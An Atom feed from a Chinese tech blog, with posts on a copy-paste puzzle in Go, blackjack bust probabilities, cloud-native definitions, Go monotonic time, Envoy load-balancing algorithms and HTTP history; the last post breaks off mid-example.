<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Zablog</title>
  <subtitle>疾风知劲草 岁寒见后凋</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://zablog.me/"/>
  <updated>2019-05-16T06:57:16.660Z</updated>
  <id>http://zablog.me/</id>
  
  <author>
    <name>Zachary Marv</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>coding练习：键盘侠</title>
    <link href="http://zablog.me/2019/03/30/q02/"/>
    <id>http://zablog.me/2019/03/30/q02/</id>
    <published>2019-03-30T13:00:00.000Z</published>
    <updated>2019-05-16T06:57:16.660Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目-Question"><a href="#题目-Question" class="headerlink" title="题目 / Question"></a>题目 / Question</h2><p>网络喷子键盘侠的输入框上已经键入了一句喷人的话，现在他的键盘上只有两个键可用<br>C：拷贝，可以把输入框的所有内容拷贝下来<br>P：粘贴，可以在输入框结尾处添加刚刚拷贝的所有内容<br>请问他至少需要按多少次，可以把输入框里的话复制N次发送出去呢？</p>
<a id="more"></a>
<h2 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h2><p>如果不可能，则返回{-1, “”}。<br>我们保证 N &gt;= 0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">N = 0</div><div class="line">做不到，返回 -1, &quot;&quot;</div><div class="line"></div><div class="line">N = 1</div><div class="line">0次：</div><div class="line"></div><div class="line">N = 2</div><div class="line">2次：CP</div><div class="line"></div><div class="line">N = 12</div><div class="line">7次：CPCPCPP</div></pre></td></tr></table></figure>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>有的同学可能会误以为这是一个动态规划的题目，<br>可能是因为有一道题叫做“矩阵乘法”，这个题目相比来说很类似。</p>
<p>实际上因为它可以完全用贪心法，所以没有必要动态规划。</p>
<p>直接采用因式分解，然后把因子加起来就可以了。</p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">// KeyPress accepts target number of repeat times on the screen,</span></div><div class="line"><span class="comment">// 	returns times of key pressing &amp; key pressing sequence</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">KeyPress</span><span class="params">(N <span class="keyword">int</span>)</span> <span class="params">(<span class="keyword">int</span>, <span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	<span class="keyword">var</span> seq <span class="keyword">string</span></div><div class="line">	<span class="keyword">if</span> N &lt;= <span class="number">0</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>, seq</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">var</span> result = <span class="number">0</span></div><div class="line">	<span class="keyword">for</span> i := <span class="number">2</span>; i &lt;= N; &#123;</div><div class="line">		<span class="keyword">if</span> N%i == <span class="number">0</span> &#123;</div><div class="line">			N = N / i</div><div class="line">			result += i</div><div class="line">			seq = seq + <span class="string">"C"</span></div><div class="line">			<span class="keyword">for</span> j := <span class="number">1</span>; j &lt; i; j++ &#123;</div><div class="line">				seq = seq + <span class="string">"P"</span></div><div class="line">			&#125;</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			i++</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> result, seq</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;题目-Question&quot;&gt;&lt;a href=&quot;#题目-Question&quot; class=&quot;headerlink&quot; title=&quot;题目 / Question&quot;&gt;&lt;/a&gt;题目 / Question&lt;/h2&gt;&lt;p&gt;网络喷子键盘侠的输入框上已经键入了一句喷人的话，现在他的键盘上只有两个键可用&lt;br&gt;C：拷贝，可以把输入框的所有内容拷贝下来&lt;br&gt;P：粘贴，可以在输入框结尾处添加刚刚拷贝的所有内容&lt;br&gt;请问他至少需要按多少次，可以把输入框里的话复制N次发送出去呢？&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>计算21点在摸五张的情况下不爆牌的概率</title>
    <link href="http://zablog.me/2018/12/30/q01/"/>
    <id>http://zablog.me/2018/12/30/q01/</id>
    <published>2018-12-30T13:00:00.000Z</published>
    <updated>2018-12-30T13:39:38.066Z</updated>
    
    <content type="html"><![CDATA[<p>21点游戏，在摸五张牌的情况下，不爆牌的概率。/ Calculating the probability of no burst while fetching 5 cards in blackjack.</p>
<a id="more"></a>
<h2 id="详细-Details"><a href="#详细-Details" class="headerlink" title="详细 / Details"></a>详细 / Details</h2><p>21点游戏，英文：Blackjack，是使用扑克牌玩的赌博游戏。</p>
<p>A可作1点或11点，2-10作该牌之点数，J、Q、K作10点。</p>
<p>玩家初始手上有2张牌。</p>
<p>如果玩家要牌后，其手上拥有的牌的总点数超过21点，便要揭开手上所拥有的牌，称为爆牌。</p>
<p>反之若其手上拥有的牌的总点数不超过21点，该玩家可决定是否继续要牌。</p>
<p>假设一个玩家为了完成某项挑战，一定会选择要牌三次，那么对于一局游戏来说，他要牌三次仍未爆牌的概率是多少？</p>
<h2 id="背景-Background"><a href="#背景-Background" class="headerlink" title="背景 / Background"></a>背景 / Background</h2><p>最近在玩R星开发的《荒野大镖客2》游戏，遇到了一个“赌徒系列挑战”之8：</p>
<p><img src="https://github.com/pkumza/coding/blob/master/q01/images/q01_01.jpeg?raw=true" alt="赌徒8"></p>
<p>当时耗费了2个小时不停地玩21点，终于完成了这个挑战。</p>
<p>这个挑战在网上被吐槽不少，只要在搜索引擎搜索“赌徒8”，全都是喷这个挑战的。大家都认为这个挑战的运气成分太大，而且完成这个挑战非常困难。</p>
<p>我突发奇想，想计算一下要牌3次还不爆牌的概率。（要牌3次就是有5张手牌）发现这是一个很好的概率题。</p>
<p>当然，对于真正的赌徒8挑战来说，想要算出完成赌徒8需要的期望局数，并不是3/不爆牌的概率。题目对于真正的游戏有一些简化。（尝试抽出最挑战大脑的部分，忽略其他细节，细节写在下面了。）</p>
<blockquote>
<p>首先，不爆牌并不意味着能赢过庄家，庄家仍有可能比你的5张牌更接近21点；<br>其次，这个游戏没有办法在已经达到21点的时候继续要牌。譬如你起手牌为 <code>A</code>和<code>K</code>，那么游戏会自动让你停牌，虽然这个时候你仍有可能摸5张牌而不爆，但是游戏机制决定你在这种情况下没办法继续摸牌了。 </p>
</blockquote>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>一共有52张牌。A,2,3,4,5,6,7,8,9,10,J,Q,K各四张。<br>因为题目要求是不爆牌，所以A看做11点是没有意义的，直接把A当做1点即可。</p>
<p>52张牌中任意选5张，一共有C(52,5)种可能，即2598960种。<br>剩下的只需要枚举出所有的不爆牌的情形即可。</p>
<h2 id="Solution01"><a href="#Solution01" class="headerlink" title="Solution01"></a>Solution01</h2><p>使用模拟的方法，模拟1000000次情形，并统计不爆牌的次数，得出一个近似概率。</p>
<p>不是特别准确，但是也可以当做一个近似值。但是要真正较真的话，这是一个错误的解法。</p>
<p>实测：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ go run ./s01/main.go</div><div class="line">Result is 0.053647</div><div class="line">Time consumed 505.888256ms</div></pre></td></tr></table></figure></p>
<h2 id="Solution02"><a href="#Solution02" class="headerlink" title="Solution02"></a>Solution02</h2><p>暴力枚举</p>
<p>通过迭代的方式，枚举出每一种方法，并计算出总的不爆牌的方法数目，最终除以总方法数，得到概率值。<br>该方法的核心点在于模拟。</p>
<p><strong>算法复杂度</strong></p>
<p>以总牌数为 <code>M</code>， 需要摸的牌数为 <code>N</code>，阈值为 <code>T</code>。</p>
<p><strong>时间复杂度</strong></p>
<p><code>O(M^N)</code> 指数级别，复杂度与阈值无关。</p>
<p><strong>空间复杂度</strong></p>
<p>很少，使用函数迭代，还有一个记录扑克的数组，勉强算是消耗 <code>O(M+N)</code> 的空间而已，</p>
<p><strong>实测</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">go run ./s02/main.go</div><div class="line">Result is 0.053856927386339154</div><div class="line">Time consumed 7.98652ms</div></pre></td></tr></table></figure></p>
<h2 id="Solution03"><a href="#Solution03" class="headerlink" title="Solution03"></a>Solution03</h2><p>状态保留</p>
<p>我们调用<code>numOfPossibleCases</code>函数的时候发现，很多参数一模一样的被调用了很多次。<br>我们建立一个HashMap保存一下状态，当遇到已经吊用过的函数时候，直接返回即可，不需要再次计算。<br>达到免除重复计算的剪枝效果。</p>
<p><strong>算法复杂度</strong></p>
<p>以总牌数为 <code>M</code>， 需要摸的牌数为 <code>N</code>，阈值为 <code>T</code>。</p>
<p><strong>时间复杂度</strong></p>
<p><code>O(N*T*M^2)</code> 将指数级别的复杂度降到了多项式级别。</p>
<p><strong>空间复杂度</strong></p>
<p>需要用一个 <code>HashMap</code> 来暂存状态</p>
<p>复杂度为<code>O(N*T*M)</code></p>
<p>实测：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">go run ./s03/main.go</div><div class="line">Result is 0.053856927386339154</div><div class="line">Time consumed 1.408398ms</div></pre></td></tr></table></figure></p>
<h2 id="Solution04"><a href="#Solution04" class="headerlink" title="Solution04"></a>Solution04</h2><p>动态规划</p>
<p>var dp [maxCardsToPick + 1][maxThreshold + 1][maxStart + 1]int</p>
<p>dp[i][j][k]的含义为：摸i张牌，最大不超过j，从第k张开始到最后一张牌是可选的范围，那么有几种摸牌的可能性。</p>
<p>状态转移方程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dp[i][j][k] = ∑ (l from k to totalNum) dp[i-1][j-pokers[l]][l+1]</div></pre></td></tr></table></figure>
<p><strong>算法复杂度</strong></p>
<p>以总牌数为 <code>M</code>， 需要摸的牌数为 <code>N</code>，阈值为 <code>T</code>。</p>
<p><strong>时间复杂度</strong></p>
<p><code>O(N*T*M^2)</code> 将指数级别的复杂度降到了多项式级别。</p>
<p><strong>空间复杂度</strong></p>
<p>建立了一个三维数组 var dp [maxCardsToPick + 1][maxThreshold + 1][maxStart + 1]int<br>复杂度为<code>O(N*T*M)</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">go run ./s04/main.go</div><div class="line">Result is 0.053856927386339154</div><div class="line">Time consumed 474.663µs</div></pre></td></tr></table></figure>
<h2 id="Solution05"><a href="#Solution05" class="headerlink" title="Solution05"></a>Solution05</h2><p>优化空间复杂度的动态规划</p>
<p>因为三维数组的每一层只和前面一层有关系，因此可以通过翻转的方式，减少内存消耗。</p>
<p><strong>算法复杂度</strong></p>
<p>以总牌数为 <code>M</code>， 需要摸的牌数为 <code>N</code>，阈值为 <code>T</code>。</p>
<p><strong>时间复杂度</strong></p>
<p>和 Solution04 一致</p>
<p><strong>空间复杂度</strong></p>
<p>建立了一个三维数组 var dp [2][maxThreshold + 1][maxStart + 1]int<br>复杂度为<code>O(T*M)</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">go run ./s05/main.go</div><div class="line">Result is 0.053856927386339154</div><div class="line">Time consumed 402.794µs</div></pre></td></tr></table></figure>
<hr>
<p>代码库位置 <a href="https://github.com/pkumza/coding/tree/master/q01" target="_blank" rel="noopener">https://github.com/pkumza/coding/tree/master/q01</a></p>
<p>附：测试环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">MacBook Pro</div><div class="line">macOS Mojave 10.14.2</div><div class="line">2.4 GHz Intel Core i7</div><div class="line">16 GB 1867 MHz LPDDR3</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;21点游戏，在摸五张牌的情况下，不爆牌的概率。/ Calculating the probability of no burst while fetching 5 cards in blackjack.&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>云原生的定义</title>
    <link href="http://zablog.me/2018/12/23/CloudNative/"/>
    <id>http://zablog.me/2018/12/23/CloudNative/</id>
    <published>2018-12-23T13:00:00.000Z</published>
    <updated>2018-12-23T06:19:21.373Z</updated>
    
    <content type="html"><![CDATA[<p>云原生是一个比较新的概念。<br>Pivotal 是相关领域的先行者。<br><a href="https://www.cncf.io/" target="_blank" rel="noopener">CNCF</a>是一个2015年成立的基金会。<br>他们都对云原生有着自己的定义</p>
<a id="more"></a>
<h1 id="Pivotal"><a href="#Pivotal" class="headerlink" title="Pivotal"></a>Pivotal</h1><p>Pivotal 最早给出了相关的定义。</p>
<blockquote>
<p>Cloud-native is an approach to building and running applications that exploits the advantages of the cloud computing delivery model. Cloud-native is about how applications are created and deployed, not where.<br>While today public cloud impacts the thinking about infrastructure investment for virtually every industry, a cloud-like delivery model isn’t exclusive to public environments. It’s appropriate for both public and private clouds. Most important is the ability to offer nearly limitless computing power, on-demand, along with modern data and application services for developers. When companies build and operate applications in a cloud-native fashion, they bring new ideas to market faster and respond sooner to customer demands.</p>
<p>Organizations require a platform for building and operating cloud-native applications and services that automates and integrates the concepts of DevOps, continuous delivery, microservices, and containers:</p>
</blockquote>
<p>云原生是一种利用云计算交付模型的优势，来构建和运行应用程序的方法。<br>云原生的关注点在于应用程序如何创建和部署，而不关注在哪里部署。<br>虽然今天的公共云影响了几乎每个行业的基础设施投资思想，但类似云的交付模式并不仅限于公共环境。<br>它适用于公共云和私有云。<br>云原生应当始终是架构团队的追求目标。<br>当我们能够为业务团队按需提供充沛的计算能力，现代化的数据库和应用程序服务，那么业务团队也就能够更快地把新想法推向市场，并更快地响应客户请求。</p>
<p>组织需要一个平台来构建和运行云原生应用程序和服务，以自动化和集成DevOps，持续交付，微服务和容器的概念：</p>
<h1 id="CNCF"><a href="#CNCF" class="headerlink" title="CNCF"></a>CNCF</h1><p>云原生计算基金会（Cloud Native Computing Foundation）给出了另一个定义。</p>
<blockquote>
<p>Cloud native technologies empower organizations to build and run scalable applications in modern, dynamic environments such as public, private, and hybrid clouds. Containers, service meshes, microservices, immutable infrastructure, and declarative APIs exemplify this approach.</p>
<p>These techniques enable loosely coupled systems that are resilient, manageable, and observable. Combined with robust automation, they allow engineers to make high-impact changes frequently and predictably with minimal toil.</p>
<p>The Cloud Native Computing Foundation seeks to drive adoption of this paradigm by fostering and sustaining an ecosystem of open source, vendor-neutral projects. We democratize state-of-the-art patterns to make these innovations accessible for everyone.</p>
<p>云原生技术有利于各组织在公有云、私有云和混合云等新型动态环境中，构建和运行可弹性扩展的应用。</p>
<p>云原生的代表技术包括<code>容器</code>、<code>服务网格</code>、<code>微服务</code>、<code>不可变基础设施</code>和<code>声明式API</code>。</p>
<p>这些技术能够构建容错性好、易于管理和便于观察的松耦合系统。结合可靠的自动化手段，云原生技术使工程师能够轻松地对系统作出频繁和可预测的重大变更。</p>
<p>云原生计算基金会（CNCF）致力于培育和维护一个厂商中立的开源生态系统，来推广云原生技术。我们通过将最前沿的模式民主化，让这些创新为大众所用。</p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1></blockquote>
<ul>
<li><a href="https://github.com/cncf/toc/blob/master/DEFINITION.md" target="_blank" rel="noopener">https://github.com/cncf/toc/blob/master/DEFINITION.md</a></li>
<li><a href="https://pivotal.io/cloud-native" target="_blank" rel="noopener">https://pivotal.io/cloud-native</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;云原生是一个比较新的概念。&lt;br&gt;Pivotal 是相关领域的先行者。&lt;br&gt;&lt;a href=&quot;https://www.cncf.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;CNCF&lt;/a&gt;是一个2015年成立的基金会。&lt;br&gt;他们都对云原生有着自己的定义&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Monotonic time</title>
    <link href="http://zablog.me/2018/11/29/Monotonic/"/>
    <id>http://zablog.me/2018/11/29/Monotonic/</id>
    <published>2018-11-29T13:00:00.000Z</published>
    <updated>2018-11-29T06:14:39.322Z</updated>
    
    <content type="html"><![CDATA[<p>go 1.9 之后，给Time增加了 Monotonic 部分。</p>
<a id="more"></a>
<p>系统提供了wall time 和 monotonic 时间。<br>其中wall time会根据时间校准而改变，而monotonic不会。</p>
<p>举个例子。<br>你写了一个日志收集程序，每10秒把收到的日志汇报给流式收集系统。<br>但是你的机器事件比真实时间快了1分钟。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">now := time.Now()</div><div class="line">&lt;-now.After(time.Second*<span class="number">10</span>):</div><div class="line"><span class="comment">// do sth</span></div></pre></td></tr></table></figure>
<p>假如得到now的时间以后，机器与外部时间进行了一步同步，把本机实际时间调慢1分钟，那么程序将会在第二行卡上70秒。<br>这会导致本地日志队列可能会爆仓。</p>
<p>与Duration相关的时间操作，譬如time.Since(start), time.Until(deadline), and time.Now().Before(deadline)等，对于时间重置非常敏感，所以它们需要参考 Monotonic 时间。</p>
<p>而如果时间是为了打印，或者start time/deadline time是外界传入的，那么 monotonic 时间将会是一个干扰。 此时应该使用  t = t.Round(0) 排除 monotonic。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;go 1.9 之后，给Time增加了 Monotonic 部分。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>Envoy中的 LB 算法</title>
    <link href="http://zablog.me/2018/10/29/LB/"/>
    <id>http://zablog.me/2018/10/29/LB/</id>
    <published>2018-10-29T13:00:00.000Z</published>
    <updated>2018-10-30T02:18:36.825Z</updated>
    
    <content type="html"><![CDATA[<p>LB是现代高并发应用必然的需求，下面介绍一下Envoy中使用的LB算法。</p>
<a id="more"></a>
<p>from <a href="https://github.com/envoyproxy/envoy/blob/stable/v1.7.1/api/envoy/api/v2/cds.proto#L119" target="_blank" rel="noopener">https://github.com/envoyproxy/envoy/blob/stable/v1.7.1/api/envoy/api/v2/cds.proto#L119</a></p>
<figure class="highlight pb"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">enum LbPolicy &#123;</div><div class="line">    ROUND_ROBIN = 0<span class="comment">;</span></div><div class="line">    LEAST_REQUEST = 1<span class="comment">;</span></div><div class="line">    RING_HASH = 2<span class="comment">;</span></div><div class="line">    RANDOM = 3<span class="comment">;</span></div><div class="line">    ORIGINAL_DST_LB = 4<span class="comment">;</span></div><div class="line">    MAGLEV = 5<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="ROUND-ROBIN"><a href="#ROUND-ROBIN" class="headerlink" title="ROUND_ROBIN"></a>ROUND_ROBIN</h2><p>ROUND_ROBIN是使用最为广泛的LB算法，轮询。<br>举个例子：<br>1，2，3，4，5，6，六个请求依次访问有两个后端的LB，那么依ROUND_ROBIN算法，<br>服务器A服务1，3，5<br>服务器B服务2，4，6</p>
<p>Envoy的ROUND_ROBIN实际上是加权的。<br>由于服务后端的处理能力不同。假如服务器A能力比较强，我们分配了Weight=2；B的服务能力一般，我们分配了Weight=1，那么依照Weighted Round-Robin<br>服务器A服务1，2，4，5<br>服务器B服务3，6</p>
<h2 id="LEAST-REQUEST"><a href="#LEAST-REQUEST" class="headerlink" title="LEAST_REQUEST"></a>LEAST_REQUEST</h2><p>LEAST_REQUEST的意思是把请求送给当前活跃请求最少的服务器。<br>因为不同的请求需要耗费的资源实际上也是不一样的，我们假设2，4，6请求都特别耗费资源，1，3，5请求都很简单，那么把2，4，6都分配给服务器B就不甚合理。<br>1，2两个请求来了<br>服务器A服务1<br>服务器B服务2<br>1很快结束了，2还卡单<br>请求3来了，由于B现在有1个active req，A没有，所以分配给A<br>请求3也很快处理完<br>请求4来了，由于B现在有1个active req，A没有，所以分配给A<br>两个都在卡单。<br>请求5和6来了，分别分配给A，B。<br>最终，所有请求解决。</p>
<p>综上<br>服务器A服务1，3，4，5<br>服务器B服务2，6</p>
<h2 id="RING-HASH"><a href="#RING-HASH" class="headerlink" title="RING_HASH"></a>RING_HASH</h2><p>环形哈希是最基本的一致性哈希算法<br>需要设置hash key</p>
<p>来了一个新的请求，需要得到下游的时候，需要对Lookup Table进行二分查找。<br>当Lookup Table的大小为N的时候，需要Log(N)的查找时间复杂度。<br>N太大，每次查找时间太长；<br>N太小，环形哈希的均匀性又不够。<br>这个地方需要Trade-off，或者可以选用Maglev算法。</p>
<h2 id="RANDOM"><a href="#RANDOM" class="headerlink" title="RANDOM"></a>RANDOM</h2><p>纯随机<br>一般效果还不错。</p>
<h2 id="ORIGINAL-DST-LB"><a href="#ORIGINAL-DST-LB" class="headerlink" title="ORIGINAL_DST_LB"></a>ORIGINAL_DST_LB</h2><p>原始目的地负载均衡</p>
<p>upstream的主机基于downstream的连接元数据。这个是envoy特定的，不详细讲了。</p>
<h2 id="MAGLEV"><a href="#MAGLEV" class="headerlink" title="MAGLEV"></a>MAGLEV</h2><p>一种特殊的一致性哈希算法，效率比环形哈希要高一些，增删节点的影响一般更小。<br>需要设置hash key</p>
<p>首先对每一个后端节点产生一个permutation；<br>然后用一种特殊的walk算法，得到一个Lookup Table。<br>新的请求到来的时候，只需要直接查表即可，时间复杂度为O(1)。<br>walk算法保证哈希的概率是基本均匀的。</p>
<h1 id="Extra-healthy-panic-threshold"><a href="#Extra-healthy-panic-threshold" class="headerlink" title="Extra: healthy_panic_threshold"></a>Extra: healthy_panic_threshold</h1><p>Envoy中有一个监控恐慌阈值的设置，这个设置很有意思，所以在这里额外讲一下。</p>
<p>负载均衡一般是根据集群中主机的健康情况灵活变动的。当某台主机跪了，LB算法将会把它从候选列表中踢出去，这也是很合理的。</p>
<p>但是我们假设这么一种情况，某一时间，所有服务主机的负载情况是最大负载的80%，（负载800；最大处理能力1000）<br>因为某种原因，导致20.0%的机器彻底崩溃。（负载800；最大处理能力800）<br>LB策略忽略20%的机器，导致剩下的80%的机器都在最大处理负载上运行；<br>又来了一个网络波动，造成所有的服务器一个接一个崩溃，整个集群雪崩。<br>每拉起一台新的机器，LB策略立刻把所有的流量打到这么一台机器上，导致它再次崩溃。</p>
<p>如果有一个恐慌阈值，譬如50%，那么LB会在50%机器崩溃的时候，禁用淘汰策略，把所有机器都当做健康的，在整体集群上执行普通的Round-Robin策略。<br>多数机器恢复，整个集群的处理能力恢复80%的正确率。这使得整个集群能够在遇到极特殊情况的时候能够从困境中恢复。</p>
<p># </p>
<p>通用运营后台</p>
<p>火山和抖音都有搜索彩蛋的需求 就是搜索某个特定词的时候 出一些彩蛋，配合广告售卖或者活动<br>大家接到需求的想法就是 写个运营后台，数据存入mysql，然后再起个脚本，定时把数据按照格式dump到redis，在线服务读redis判断<br>或者说 单独抽象一个服务，运营后台负责写入，在线业务负责读取</p>
<p>搜索结果过滤条件</p>
<p>客户端配置，广告、图片链接配置，客户端Toast提示文本内容。<br>你可以设置用户满足什么地域、UID在哪个灰度的情况下，更换某一项内容。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;LB是现代高并发应用必然的需求，下面介绍一下Envoy中使用的LB算法。&lt;/p&gt;
    
    </summary>
    
      <category term="个人随笔" scheme="http://zablog.me/categories/%E4%B8%AA%E4%BA%BA%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="技术随笔" scheme="http://zablog.me/tags/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>HTTP 简史复习</title>
    <link href="http://zablog.me/2018/10/04/http-brief-history/"/>
    <id>http://zablog.me/2018/10/04/http-brief-history/</id>
    <published>2018-10-04T13:00:00.000Z</published>
    <updated>2018-10-29T12:47:48.191Z</updated>
    
    <content type="html"><![CDATA[<p>简要复习一下HTTP的发展历史。</p>
<a id="more"></a>
<h2 id="HTTP-0-9"><a href="#HTTP-0-9" class="headerlink" title="HTTP/0.9"></a>HTTP/0.9</h2><p>初代不成熟协议，只支持<code>GET</code>命令，仅接受HTML格式的子串，一次请求结束之后TCP连接随即关闭。</p>
<h2 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP/1.0"></a>HTTP/1.0</h2><p>不仅支持HTML，还支持图片、视频、二进制文件等。<br>增加了 POST HEAD，<br>每次Req和Resp都必须含有头部。整个头部只能使用ASCII编码<br>新增了状态码、权限、缓存、内容编码(content encoding)等功能。<br>新增Content-Type字段。</p>
<p>缺点：<br>但是每次只能发送一个请求，三次握手比较慢，另外需要慢启动。</p>
<p>连接复用采用 <code>Connection: keep-alive</code> 字段，该字段非标准。</p>
<h2 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP/1.1"></a>HTTP/1.1</h2><p>RFC 2616<br>第一个有正式标准的版本。</p>
<p>举个 🌰</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">$&gt; telnet website.org 80</div><div class="line">Connected to xxx.xxx.xxx.xxx</div><div class="line"></div><div class="line">GET /index.html HTTP/1.1 ①</div><div class="line">Host: website.org</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4)... (snip)</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Encoding: gzip,deflate,sdch</div><div class="line">Accept-Language: en-US,en;q=0.8</div><div class="line">Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3</div><div class="line">Cookie: __qca=P0-800083390... (snip)</div><div class="line"></div><div class="line">HTTP/1.1 200 OK ②</div><div class="line">Server: nginx/1.0.11</div><div class="line">Connection: keep-alive</div><div class="line">Content-Type: text/html; charset=utf-8</div><div class="line">Via: HTTP/1.1 GWA</div><div class="line">Date: Wed, 25 Jul 2012 20:23:35 GMT</div><div class="line">Expires: Wed, 25 Jul 2012 20:23:35 GMT</div><div class="line">Cache-Control: max-age=0, no-cache</div><div class="line">Transfer-Encoding: chunked</div><div class="line"></div><div class="line">100  ③</div><div class="line">&lt;!doctype html&gt;</div><div class="line">(snip)</div><div class="line"></div><div class="line">100</div><div class="line">(snip)</div><div class="line"></div><div class="line">0 ④</div><div class="line"></div><div class="line">GET /favicon.ico HTTP/1.1 ⑤</div><div class="line">Host: www.website.org</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4)... (snip)</div><div 